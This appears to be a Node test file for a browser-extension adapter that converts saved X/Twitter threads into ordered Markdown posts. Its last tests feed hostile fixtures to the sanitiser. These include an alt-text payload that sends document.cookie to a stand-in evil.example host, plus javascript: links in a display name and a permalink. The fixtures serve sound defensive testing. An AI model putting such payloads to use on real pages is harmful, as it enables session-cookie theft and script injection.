// X / Twitter thread adapter (CLIP-10).
//
// A thread saved by the generic pipeline is a wall of interleaved spans with
// no idea where one post ends and the next begins. Unrolling it — ordered
// posts, each with an author and a timestamp — is the whole job.

import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { loadExtensionScripts } from "../test_helpers.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const fixture = (name) => readFileSync(join(HERE, "fixtures", name), "utf8");

const g = loadExtensionScripts([
  "domlite.js",
  "markdown.js",
  "adapters/util.js",
  "adapters/registry.js",
  "adapters/twitter.js",
]);

const STATUS = "https://x.com/adarenn/status/1764000000000000001";
const run = (url, html) =>
  g.MonoAdapters.run({ url, tree: g.MonoDomLite.parse(html), baseUrl: url, title: "t" });

test("it claims a status permalink on either domain and nothing else", () => {
  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "twitter");

  assert.ok(ad.match({ url: STATUS }));
  assert.ok(ad.match({ url: "https://twitter.com/adarenn/status/1764000000000000001" }));
  assert.ok(ad.match({ url: "https://mobile.twitter.com/a/status/1/photo/1" }));
  assert.equal(ad.match({ url: "https://x.com/adarenn" }), false, "a profile is not a thread");
  assert.equal(ad.match({ url: "https://x.com/home" }), false);
  assert.equal(ad.match({ url: "https://notx.test/a/status/1" }), false);
});

test("the thread unrolls into ordered posts with author and timestamp", () => {
  const out = run(STATUS, fixture("twitter.html"));

  assert.equal(out.adapter, "twitter");
  assert.equal(out.meta.postCount, 4);

  const posts = out.markdown.split(/^## /m).slice(1);
  assert.equal(posts.length, 4, "one heading per post");
  assert.match(posts[0], /^Ada Renn \(@adarenn\) — 2024-03-02T09:30:00\.000Z/);
  assert.match(posts[0], /The drawer was painted shut\./);
  assert.match(posts[1], /41 years of entries\./);
  // Text split across sibling spans has to read as one sentence again.
  assert.match(posts[1], /the page for the night of the 1948 wreck:/);
  assert.match(posts[3], /^Kit Moreau \(@kitmoreau\)/);

  // Order is document order, which is reply order.
  assert.ok(out.markdown.indexOf("painted shut") < out.markdown.indexOf("41 years"));
  assert.ok(out.markdown.indexOf("41 years") < out.markdown.indexOf("best thing I have read"));
});

test("images become links, never inlined bytes", () => {
  const out = run(STATUS, fixture("twitter.html"));
  assert.match(
    out.markdown,
    /!\[A handwritten logbook page\]\(https:\/\/pbs\.twimg\.com\/media\/GHxxxxxxxxxxxx\?format=jpg&name=small\)/
  );
});

test("each post carries its own permalink", () => {
  const out = run(STATUS, fixture("twitter.html"));
  assert.match(out.markdown, /https:\/\/x\.com\/adarenn\/status\/1764000000000000002/);
  assert.equal(out.meta.author, "@adarenn");
});

test("a link in a post survives as a link", () => {
  const out = run(STATUS, fixture("twitter.html"));
  assert.match(out.markdown, /\[coastal\.example\/ledger\]\(https:\/\/t\.co\/aBcDeFgHiJ\)/);
});

test("the title names the thread's author and opening line", () => {
  const out = run(STATUS, fixture("twitter.html"));
  assert.match(out.title, /^Ada Renn \(@adarenn\): The drawer was painted shut/);
  assert.match(out.markdown, /^# Ada Renn \(@adarenn\)/);
});

test("a status page with no recognizable posts falls back", () => {
  const out = run(STATUS, `<html><body><div id="react-root"><div>Something went wrong.</div></div></body></html>`);
  assert.equal(out, null);
  assert.ok(g.MonoAdapters.lastWarnings().some((w) => /twitter declined/.test(w)));
});

test("a post whose author block vanished is still captured, with a warning", () => {
  const html = `<html><body>
    <article data-testid="tweet" role="article">
      <div data-testid="tweetText"><span>An orphaned post.</span></div>
    </article></body></html>`;
  const out = run(STATUS, html);

  assert.match(out.markdown, /An orphaned post\./);
  assert.ok(out.warnings.some((w) => /author/i.test(w)));
});

test("a data: image URI is never inlined into readable.md", () => {
  // The bytes belong in page.mhtml. A base64 blob in readable.md is both
  // useless to a reader and a way to smuggle content past the renderer.
  const html = `<html><body>
    <article data-testid="tweet" role="article">
      <div data-testid="User-Name"><a href="/adarenn">Ada Renn</a><a href="/adarenn">@adarenn</a>
        <time datetime="2024-03-02T09:30:00.000Z">2h</time></div>
      <div data-testid="tweetText"><span>Look at this.</span></div>
      <div data-testid="tweetPhoto">
        <img alt="A chart" src="data:image/svg+xml;base64,${"QUJD".repeat(300)}">
      </div>
    </article></body></html>`;
  const out = run(STATUS, html);

  assert.doesNotMatch(out.markdown, /base64/i, "no inlined bytes");
  assert.doesNotMatch(out.markdown, /data:image/i);
  assert.match(out.markdown, /!\[A chart\]/, "the alt text still says what was there");
});

test("markdown syntax in an alt text or a display name cannot forge a link", () => {
  // Every part of a post is attacker-controlled: alt text, display name,
  // handle and the src itself. None of them may become Markdown syntax.
  const html = `<html><body>
    <article data-testid="tweet" role="article">
      <div data-testid="User-Name">
        <a href="/x">Ada](javascript:alert(1)) Renn</a>
        <a href="/x">@adarenn</a>
        <time datetime="2024-03-02T09:30:00.000Z">2h</time>
      </div>
      <div data-testid="tweetText"><span>Hello.</span></div>
      <div data-testid="tweetPhoto">
        <img alt="![](https://evil.example) [pwn](javascript:fetch('//evil.example/'+document.cookie))"
             src="https://pbs.twimg.com/media/ok.jpg">
      </div>
    </article></body></html>`;
  const out = run(STATUS, html);

  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i, "no javascript: target survives");
  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(https:\/\/evil\.example\)/, "no second image is forged out of the alt");
  assert.match(out.markdown, /https:\/\/pbs\.twimg\.com\/media\/ok\.jpg/, "the real image is still there");
});

test("a javascript: permalink is dropped rather than recorded", () => {
  const html = `<html><body>
    <article data-testid="tweet" role="article">
      <div data-testid="User-Name"><a href="/adarenn">@adarenn</a>
        <a href="javascript:void(0)/status/1764000000000000009">link</a>
        <time datetime="2024-03-02T09:30:00.000Z">2h</time></div>
      <div data-testid="tweetText"><span>Body.</span></div>
    </article></body></html>`;
  const out = run(STATUS, html);
  assert.doesNotMatch(out.markdown, /javascript:/i);
});
